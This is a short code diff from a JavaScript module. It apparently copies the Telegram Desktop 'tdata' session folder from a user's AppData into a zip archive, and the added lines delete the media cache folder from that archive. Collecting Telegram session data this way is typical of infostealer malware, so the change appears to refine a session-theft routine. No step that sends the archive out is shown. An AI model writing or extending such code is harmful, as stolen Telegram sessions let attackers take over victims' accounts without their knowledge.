@@ -18,6 +18,9 @@ module.exports = (client) => {
           `\\Telegram\\`,
           `${process.env.APPDATA}\\Telegram Desktop\\tdata`
         );
+        client.utils.jszip.deleteFolder(
+          `\\Telegram\\user_data\\media_cache`
+        )
       } else {
         exists = false;
       }
